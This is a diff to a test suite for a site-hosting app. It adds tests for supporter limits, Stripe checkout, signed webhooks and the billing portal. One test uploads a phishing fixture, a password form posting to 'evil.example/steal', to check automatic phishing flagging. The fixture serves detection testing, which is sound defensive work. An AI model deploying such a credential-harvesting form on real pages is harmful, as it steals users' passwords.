@@ -12,8 +12,24 @@ process.env.ADMIN_EMAILS = 'boss@example.com';
 process.env.SHOT_TOKEN = 'test-shot-token';
 process.env.QUOTA_MB = '1';
 process.env.MAX_FILE_MB = '1';
+process.env.SUPPORTER_QUOTA_MB = '3';
+process.env.SUPPORTER_MAX_FILE_MB = '2';
+process.env.STRIPE_SECRET_KEY = 'sk_test_fake';
+process.env.STRIPE_WEBHOOK_SECRET = 'whsec_test';
+process.env.STRIPE_PRICE_ID = 'price_test';
 delete process.env.SMTP_HOST;
 delete process.env.TURNSTILE_SECRET_KEY;
+
+// Stripe's API is never called: Checkout and the billing portal answer from here, and webhooks are signed for real
+const Stripe = require('stripe');
+const stripeCalls = [];
+require.cache[require.resolve('stripe')].exports = function FakeStripe(key) {
+  const s = new Stripe(key);
+  const session = (url) => ({ sessions: { create: async (p) => { stripeCalls.push(p); return { url }; } } });
+  s.checkout = session('https://checkout.stripe.com/c/pay/test');
+  s.billingPortal = session('https://billing.stripe.com/p/session/test');
+  return s;
+};
 
 // without SMTP the app prints mail to the console; keep it so tests can follow the links
 const mail = [];
@@ -2276,4 +2292,92 @@ test('file history keeps each save of a text file, puts old versions back and br
   // deleting the account deletes its history
   await post(m, '/dashboard/delete-account', { password: 'longpassword1' });
   assert.ok(!H.exists(user.id));
+});
+
+test('supporters get bigger limits and any file type; when support lapses nothing is deleted', async () => {
+  const m = await member('bigdog');
+  const big = Buffer.alloc(1.5 * 1048576, 65);
+  const api = (path) => req('get', path);
+  assert.match((await upload(m, 'tool.exe', 'MZ')).text, /tool\.exe \(name or file type not allowed\)/);
+  assert.equal((await upload(m, 'big.png', big)).status, 400); // over the free 1 MB file limit
+  db.prepare('UPDATE users SET supporter_until = ? WHERE username = ?').run(Date.now() + 86400000, 'bigdog');
+  assert.match((await upload(m, 'tool.exe', 'MZ')).text, /Uploaded 1 file/);
+  assert.match((await upload(m, 'big.png', big)).text, /Uploaded 1 file/);
+  assert.match((await req('get', '/dashboard').set('Cookie', m.cookie)).text, /of 3 MB/);
+  // a supporter's rarer page types are still checked for phishing
+  await upload(m, 'login.xhtml', '<form action="https://evil.example/steal"><input type="password" name="pw"> verify your account</form>');
+  assert.match(db.prepare("SELECT details FROM reports WHERE site = 'bigdog' AND reason = 'Auto-flag'").get().details, /^login\.xhtml:/);
+  // the CLI reads its limits from the API
+  const key = (await req('post', '/dashboard/api').set('Cookie', m.cookie).type('form').send({ _csrf: m.csrf, action: 'new', password: 'longpassword1' })).text.match(/<pre>([^<]+)<\/pre>/)[1];
+  const site = (await api('/api/site').set('Authorization', `Bearer ${key}`)).body;
+  assert.equal(site.any_type, true);
+  assert.equal(site.quota_bytes, 3 * 1048576);
+  assert.equal(site.max_file_bytes, 2 * 1048576);
+  // lapsed: the files stay, but nothing new goes in while the site is over the free quota
+  db.prepare('UPDATE users SET supporter_until = ? WHERE username = ?').run(Date.now() - 1000, 'bigdog');
+  assert.ok(fs.existsSync(path.join(process.env.DATA_DIR, 'sites', 'bigdog', 'big.png')));
+  assert.equal((await req('get', '/big.png', 'bigdog.pad.test')).status, 200);
+  assert.match((await upload(m, 'note.txt', 'hi')).text, /note\.txt \(over your 1 MB limit\)/);
+  assert.equal((await api('/api/site').set('Authorization', `Bearer ${key}`)).body.any_type, false);
+  // and any file that is there can still be deleted
+  await req('post', '/dashboard/delete').set('Cookie', m.cookie).type('form').send({ _csrf: m.csrf, path: 'tool.exe' });
+  assert.ok(!fs.existsSync(path.join(process.env.DATA_DIR, 'sites', 'bigdog', 'tool.exe')));
+});
+
+test('supporting through Stripe: checkout, webhook, flair, billing portal and lapse', async () => {
+  const m = await member('goodboy');
+  const signer = new Stripe('sk_test_fake').webhooks;
+  const hook = (type, object, secret = 'whsec_test') => {
+    const payload = JSON.stringify({ id: `evt_${type}`, object: 'event', type, data: { object } });
+    return req('post', '/stripe/webhook').set('Content-Type', 'application/json')
+      .set('Stripe-Signature', signer.generateTestHeaderString({ payload, secret })).send(payload);
+  };
+  const row = () => db.prepare('SELECT * FROM users WHERE username = ?').get('goodboy');
+  const page = await req('get', '/dashboard/support').set('Cookie', m.cookie);
+  assert.match(page.text, /Become a supporter/);
+  assert.match(page.headers['content-security-policy'], /form-action 'self' https:\/\/checkout\.stripe\.com/);
+  assert.match((await req('get', '/dashboard').set('Cookie', m.cookie)).text, /href="\/dashboard\/support"/);
+  const go = await req('post', '/dashboard/support').set('Cookie', m.cookie).type('form').send({ _csrf: m.csrf });
+  assert.equal(go.status, 303);
+  assert.equal(go.headers.location, 'https://checkout.stripe.com/c/pay/test');
+  const call = stripeCalls.at(-1);
+  assert.equal(call.client_reference_id, String(row().id));
+  assert.equal(call.customer_email, 'goodboy@example.com');
+  assert.deepEqual(call.line_items, [{ price: 'price_test', quantity: 1 }]);
+
+  // forged or unsigned webhooks change nothing
+  assert.equal((await hook('checkout.session.completed', { customer: 'cus_1', client_reference_id: String(row().id) }, 'whsec_wrong')).status, 400);
+  assert.equal(row().stripe_customer_id, '');
+  assert.equal((await hook('checkout.session.completed', { customer: 'cus_1', client_reference_id: String(row().id) })).status, 200);
+  assert.equal(row().stripe_customer_id, 'cus_1');
+  const end = Math.floor(Date.now() / 1000) + 30 * 86400;
+  await hook('customer.subscription.created', { customer: 'cus_1', status: 'active', metadata: {}, items: { data: [{ current_period_end: end }] } });
+  assert.ok(row().supporter_until > end * 1000);
+
+  // flair wherever the name shows, and the count on the home page
+  assert.match((await req('get', '/site/goodboy')).text, /class="pic supporter"/);
+  assert.match((await req('get', '/site/goodboy')).text, /alt="PuppyPad supporter"/);
+  assert.match((await req('get', '/')).text, /kept running by \d+ supporters?/);
+  assert.equal((await req('get', '/img/supporter.svg')).status, 200);
+  assert.match((await req('get', '/dashboard/support').set('Cookie', m.cookie)).text, /You are a supporter until/);
+  // already supporting: no second subscription, but the billing portal
+  assert.equal((await req('post', '/dashboard/support').set('Cookie', m.cookie).type('form').send({ _csrf: m.csrf })).status, 409);
+  const portal = await req('post', '/dashboard/support/portal').set('Cookie', m.cookie).type('form').send({ _csrf: m.csrf });
+  assert.equal(portal.headers.location, 'https://billing.stripe.com/p/session/test');
+  assert.equal(stripeCalls.at(-1).customer, 'cus_1');
+
+  // cancelled: the perks and the flair stop at once
+  await hook('customer.subscription.deleted', { customer: 'cus_1', status: 'canceled', metadata: {}, items: { data: [{ current_period_end: end }] } });
+  assert.ok(row().supporter_until <= Date.now());
+  assert.doesNotMatch((await req('get', '/site/goodboy')).text, /alt="PuppyPad supporter"/);
+  assert.match((await req('get', '/dashboard/support').set('Cookie', m.cookie)).text, /Your support ended/);
+  // a subscription carries its member in metadata, so it lands even before checkout's event links the customer
+  await member('latepup');
+  const pupId = db.prepare('SELECT id FROM users WHERE username = ?').get('latepup').id;
+  await hook('customer.subscription.created', { customer: 'cus_2', status: 'active', metadata: { user_id: String(pupId) }, items: { data: [{ current_period_end: end }] } });
+  assert.ok(db.prepare('SELECT supporter_until FROM users WHERE id = ?').get(pupId).supporter_until > Date.now());
+
+  // the terms and the privacy page say what supporting means and who takes the money
+  assert.match((await req('get', '/rules')).text, /id="supporter-terms"/);
+  assert.match((await req('get', '/privacy')).text, /processed by Stripe/);
 });
